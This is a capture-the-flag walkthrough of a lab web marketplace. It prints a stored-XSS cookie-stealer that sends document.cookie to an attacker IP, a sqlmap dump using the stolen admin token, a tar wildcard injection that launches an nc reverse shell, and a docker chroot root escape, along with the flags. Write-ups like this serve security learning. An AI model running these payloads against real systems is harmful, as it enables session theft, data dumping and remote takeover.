# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |



# RECONNAISSANCE
---

We can check this by going into the website:

![Pasted image 20250331160802.png](../../IMAGES/Pasted%20image%2020250331160802.png)

We got a `login`, `signup`, also, we can check items:

![Pasted image 20250331160825.png](../../IMAGES/Pasted%20image%2020250331160825.png)

Let's try creating a test account to check if we got any more functionalities:

![Pasted image 20250331160919.png](../../IMAGES/Pasted%20image%2020250331160919.png)

We got some new stuff: `New Listing` and `Messages`, if we check the first one, we can see this:

![Pasted image 20250331160953.png](../../IMAGES/Pasted%20image%2020250331160953.png)

We can add queries, since the file uploads are disabled, there's no need to test for file inclusion, let's try uploading a new list with `XSS` to check if its possible on here:

![Pasted image 20250331161102.png](../../IMAGES/Pasted%20image%2020250331161102.png)

If we submit the query:

![Pasted image 20250331161110.png](../../IMAGES/Pasted%20image%2020250331161110.png)


There we go, we got XSS, we can fuzz to check if there's an admin resource anywhere in case we can get the admin cookie:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.239.175/FUZZ" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.239.175/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

new                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 225ms]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 241ms]
login                   [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 429ms]
                        [Status: 200, Size: 1785, Words: 418, Lines: 66, Duration: 603ms]
signup                  [Status: 200, Size: 667, Words: 159, Lines: 31, Duration: 477ms]
admin                   [Status: 403, Size: 392, Words: 75, Lines: 22, Duration: 393ms]
Login                   [Status: 200, Size: 857, Words: 200, Lines: 36, Duration: 361ms]
messages                [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 336ms]
```

Let's begin exploitation.

# EXPLOITATION
---


Once we send the listing, we can check we got XSS, but we can also check this interesting stuff:

![Pasted image 20250331161239.png](../../IMAGES/Pasted%20image%2020250331161239.png)

We can check that we can report listing to admins, meaning that an admin user could possibly be surveilling the website and receiving the request, maybe we can exploit the XSS to get the admin cookie:

```
<script>
  fetch('http://10.6.34.159:8000/?cookie=' + document.cookie);
</script>
```

We need to set up the python server:

```
python3 -m http.server
```

If we send the request, it gives us our own cookie, this does not helps us with anything, but remember the `report listing to admin stuff`, if we report the ticket with the cookie stealer, we can see this in our python server

```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.6.34.159 - - [31/Mar/2025 21:20:35] "GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjYsInVzZXJuYW1lIjoidGVzdDEiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc0MzQ1NTk4M30.58_BVPxAkFoIjQDdGV-SGvFtAe3Yvi98NACqx5Qg-Jw HTTP/1.1" 200 -
10.10.239.175 - - [31/Mar/2025 21:20:40] "GET /?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDM0NTYwMzl9.XxMci203JEpwiMq88Skqx40-2HDRa7ao8znkRjRjj4Q HTTP/1.1" 200 -
```


The last one is the admin cookie, we know this by decoding the `JWT Token`:

![Pasted image 20250331162253.png](../../IMAGES/Pasted%20image%2020250331162253.png)

Let's use the cookie and visualize the admin page:

![Pasted image 20250331162423.png](../../IMAGES/Pasted%20image%2020250331162423.png)

We got our first flag:

```
THM{c37a63895910e478f28669b048c348d5}
```

We notice that we can list users, if we go to any user, we can see this:

 
![Pasted image 20250331163239.png](../../IMAGES/Pasted%20image%2020250331163239.png)

The url seems odd, we can test stuff like `LFI` or `SQLI` payload:

![Pasted image 20250331163332.png](../../IMAGES/Pasted%20image%2020250331163332.png)

We got it, this page may be vulnerable to SQLI, let's use sqlmap:

```bash
sqlmap -u "http://10.10.239.175/admin?user=2" --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDM0NTYwMzl9.XxMci203JEpwiMq88Skqx40-2HDRa7ao8znkRjRjj4Q' --technique=U --delay=2 -dump
```


We get the following:

![Pasted image 20250331164347.png](../../IMAGES/Pasted%20image%2020250331164347.png)

I tried cracking these hashes but no luck, we can also find this other table:


```
$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
```


![Pasted image 20250331164802.png](../../IMAGES/Pasted%20image%2020250331164802.png)

If we read the first one, it displays the following message:

```
Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. nYour new password is: @b_ENXkGYUCAv3zJ
```

It comes from user 1 which is system to user 3, which based on the user listing is `jake`, let's go into ssh with these credentials:

```
jake:@b_ENXkGYUCAv3zJ
```

![Pasted image 20250331165002.png](../../IMAGES/Pasted%20image%2020250331165002.png)

There we go, we can now begin privilege escalation.


# PRIVILEGE ESCALATION
---


We can read the user flag now:

```
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

If we check our sudo privileges, we can see this:

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

We can check the file:

```
jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

- **Vulnerability**: TheÂ `*`Â wildcard inÂ `tar cf /opt/backups/backup.tar *`Â is dangerous. If we control the files in the directory where the script runs, we can inject malicious filenames to execute code.

Let's do the following:

```
# Let's begin by generating a netcat reverse shell using msfvenom
msfvenom -p cmd/unix/reverse_netcat lhost=IP lport=PORT R

# We can then proceed to exploit the wildcard

mkdir /tmp/exploit
cd /tmp/exploit
touch -- '--checkpoint=1'
touch -- "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo "mkfifo /tmp/gaipsa; nc 10.6.34.159 9001 0</tmp/gaipsa | /bin/sh >/tmp/gaipsa 2>&1; rm /tmp/gaipsa" >> shell.sh # Replace this with the contents that the msfvenom gave you.

# Set up the listener
nc -lvnp PORT

# Give permissions to both backup.tar and shell.sh
chmod 777 /opt/backups/backup.tar shell.sh

# Use the command
sudo -u michael /opt/backups/backup.sh
```

If we reproduce these steps, we can notice this in our listener:

![Pasted image 20250331170833.png](../../IMAGES/Pasted%20image%2020250331170833.png)

We can stabilize our shell first:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250331170920.png](../../IMAGES/Pasted%20image%2020250331170920.png)

TheÂ `docker`Â group membership (GID 999) grantsÂ **root-equivalent privileges**Â on the host system. We can exploit this to escalate into root, let's search gtfobins:

![Pasted image 20250331172216.png](../../IMAGES/Pasted%20image%2020250331172216.png)

So, based on that, we can do the following:


```
docker run -v /:/host -it alpine chroot /host /bin/sh
```


We can check this:

![Pasted image 20250331172248.png](../../IMAGES/Pasted%20image%2020250331172248.png)

There we go, we can finally read root flag:

```
root@6e6c3ee6eed0:/# cat root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

![Pasted image 20250331172348.png](../../IMAGES/Pasted%20image%2020250331172348.png)


